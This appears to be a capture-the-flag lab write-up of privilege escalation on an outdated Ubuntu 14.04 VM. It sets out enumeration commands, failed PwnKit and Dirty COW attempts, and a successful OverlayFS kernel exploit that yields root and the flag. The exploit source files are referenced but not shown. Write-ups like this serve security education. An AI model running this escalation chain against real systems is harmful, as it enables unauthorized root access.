# Challenge 1 - Gain Access to a Remote Server

### Environment

- Virtualization Platform: VirtualBox
- Initial User: `student`
- Initial Privilege Level: Standard user
- Network Mode: NAT

### Initial Access

- username : student
- password : saic

## Methodology and Brief

1. Enumerated sudo permissions and confirmed no sudo misconfigurations were present.
2. Enumerated SUID binaries and investigated potentially vulnerable binaries such as `pkexec` and `mount`, but found no exploitable misconfigurations or known working exploits.
3. Performed kernel enumeration and identified the system as running an outdated Ubuntu 14.04.6 LTS kernel (4.4.0-148).
4. Attempted privilege escalation using Dirty COW (CVE-2016-5195), which failed due to partial mitigations.
5. Successfully exploited an OverlayFS kernel vulnerability, resulting in a root shell.
6. Retrieved the flag from `/root/flag.txt`.

--- 
# Detailed Process Description

## Privilage Escalation Enumeration

### Sudo Misconfigurations Enumeration

Command:

```bash
sudo -l
```

Output :

```text
Sorry, user student may not run sudo on saic-VirtualBox.
```

This indicates that there are no sudo misconfigurations, and a different privilege escalation approach is required.

### SUID binaries Enumeration

Command:

```bash
find / -perm -4000 -type f 2>/dev/null
```
to find potentially vulnerable SUID binaries.

Output:

```text
/usr/sbin/pppd
/usr/sbin/uuidd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/mtr
/usr/bin/newgrp
/usr/bin/lppasswd
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chfn
/opt/VBoxGuestAdditions-7.1.6/bin/VBoxDRMClient
/bin/ping6
/bin/su
/bin/ping
/bin/mount
/bin/fusermount
/bin/umount
```
Here, /usr/bin/pkexec can be further inspected as a potential vulnerability. The next step is to check its version and ownership.

Command:

```bash
pkexec --version
ls -l /usr/bin/pkexec
```

Output:

```text
pkexec version 0.105
-rwsr-xr-x 1 root root 23304 Mar 27  2019 /usr/bin/pkexec
```

The pkexec binary is set to SUID, as indicated by the s permission bit in -rwsr-xr-x. The timestamp indicates it predates recent security patches, and the binary is owned by root, making it a suitable candidate for privilege escalation attempts.

The pkexec binary executes with root privileges due to its SUID configuration. In vulnerable versions, improper handling of user-supplied arguments and environment variables allows execution paths to be reached prior to policy enforcement, resulting in local privilege escalation.

Now an exploitation attempt can be made by trying to use pkexec

Command:

```bash
pkexec /bin/sh
```
Output:

It asked for authentication via password. This mean it is not directly exploitable so a different approach has to be attempted.
Also, this is same behavior as CVE-2021-4034, a well know vulnerability in polkit.
So, now a script in C can be used to potentially exploit it

Commands:

```bash
 gcc pwnkit.c -o pwnkit
 ls -l pwnkit
 env -i SHELL=/bin/sh PATH=/usr/bin:/bin pkexec ./pwnkit
```
Output:

```text
-rwxrwxr-x 1 student student 8625 Jan 16 17:05 pwnkit
Error executing command as another user: Request dismissed
```
This means that this VM is NOT exploitable via the generic PwnKit PoC path and some other alternate has to be used.

Another potentially vulnerable SUID bin is /bin/mount, to check if there is a possibility of exploitation

Command:

```bash
mount
```
Output:

```text
/dev/sda1 on / type ext4 (rw,errors=remount-ro)
proc on /proc type proc (rw,noexec,nosuid,nodev)
sysfs on /sys type sysfs (rw,noexec,nosuid,nodev)
none on /sys/fs/cgroup type tmpfs (rw)
none on /sys/fs/fuse/connections type fusectl (rw)
none on /sys/kernel/debug type debugfs (rw)
none on /sys/kernel/security type securityfs (rw)
udev on /dev type devtmpfs (rw,mode=0755)
devpts on /dev/pts type devpts (rw,noexec,nosuid,gid=5,mode=0620)
tmpfs on /run type tmpfs (rw,noexec,nosuid,size=10%,mode=0755)
none on /run/lock type tmpfs (rw,noexec,nosuid,nodev,size=5242880)
none on /run/shm type tmpfs (rw,nosuid,nodev)
none on /run/user type tmpfs (rw,noexec,nosuid,nodev,size=104857600,mode=0755)
none on /sys/fs/pstore type pstore (rw)
systemd on /sys/fs/cgroup/systemd type cgroup (rw,noexec,nosuid,nodev,none,name=systemd)
gvfsd-fuse on /run/user/1001/gvfs type fuse.gvfsd-fuse (rw,nosuid,nodev,user=student)
```
It suggests that none of these can be exploited as they are hardened with noexec,nosuid,nodev

This suggests SUID enumeration is a dead end

### Kernel Enumeration

For this first the kernel has to be inspected

Command:

```bash
uname -a
cat /etc/os-release
cat /proc/version
```

Output:

```text
Linux saic-VirtualBox 4.4.0-148-generic #174~14.04.1-Ubuntu SMP Thu May 9 08:17:37 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
NAME="Ubuntu"
VERSION="14.04.6 LTS, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04.6 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
Linux version 4.4.0-148-generic (buildd@lgw01-amd64-014) (gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.4) ) #174~14.04.1-Ubuntu SMP Thu May 9 08:17:37 UTC 2019
```
The system runs Ubuntu 14.04.6 LTS with Linux kernel 4.4.0-148.
CVE-2016-5195 (Dirty COW) affects all Linux kernels prior to 4.8.3.
Ubuntu 14.04 does not include a complete backport of the fix in this kernel version.
Therefore, it suggests that the kernel is possibly vulnerable to local privilege escalation via Dirty COW.

Dirty COW

Commands:

```bash
gcc -pthread dirtycow.c -o dirtycow
openssl passwd -1 -salt root saicroot
```
Output:

```text
$1$root$s7CcFZTo6sal/cern6m2c/
```
Running Dirty COW 

```bash
./dirtycow $6$root$s7CcFZTo6sal/cern6m2c/
su root
```
Result:
```text
su: Permission denied
```
Although this kernel version is theoretically affected by CVE-2016-5195 (Dirty COW), the exploit attempt failed in this environment, an alternative kernel exploit is required.

OverlayFS can be used as an alternate to DirtyCOW

Attempting OverlayFS:

Command:

```bash
gcc exploit.c -o exploit
./exploit
```
Output:

```text
bash-4.3#
```
This open another terminal with root access
Ubuntu 14.04 kernels prior to proper OverlayFS namespace restrictions allow unprivileged users to mount overlay filesystems in a way that can lead to privilege escalation.

Further Commands in this terminal:

```bash
whoami
id
cd /root
cat flag.txt
```

Output:

```text
root
uid=0(root) gid=0(root) groups=0(root),1001(student)
SAIC{C0ngr4ts_d0_y0u_l0v3_ST4C?}
```

## Conclusion

The system was running an outdated Ubuntu 14.04.6 LTS kernel vulnerable to local privilege escalation attacks. While common SUID and polkit-based escalation paths were mitigated, improper kernel hardening allowed exploitation of an OverlayFS vulnerability. This resulted in successful privilege escalation from a standard user to root, enabling access to `/root/flag.txt`.

This highlights the importance of timely kernel patching and OS-level security, even when application-level services appear secure.

Flag = SAIC{C0ngr4ts_d0_y0u_l0v3_ST4C?}